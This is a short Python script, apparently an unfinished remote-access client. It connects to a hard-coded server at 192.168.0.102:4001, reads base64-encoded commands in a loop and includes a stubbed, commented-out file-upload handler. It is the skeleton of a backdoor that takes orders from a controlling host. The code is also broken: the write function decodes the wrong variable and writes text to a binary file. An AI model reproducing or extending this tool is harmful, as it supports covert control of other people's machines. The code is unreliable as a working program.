import socket
from base64 import b64decode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.102", 4001))

#save file
def write_file(file_name, text):
    with open(file_name, "wb") as file:
        file.write(b64decode(file).decode())
        return "[+] Upload Successfull!"
#send data for server
def send_server(deta):
    s.send(deta)

#reciv for server data
def reciv_data():
    i = s.recv(1024)
    return b64decode(i)
    

while True:
    rcv = reciv_data().decode("UTF-8")
    rcv = rcv.split()
    print(type(rcv))
    print(len(rcv))
    print(rcv[0])
    #if rcv[0]=="uplod":
        #rs = write_file(rcv[1])
        
        #send_server(rs.encode())


        






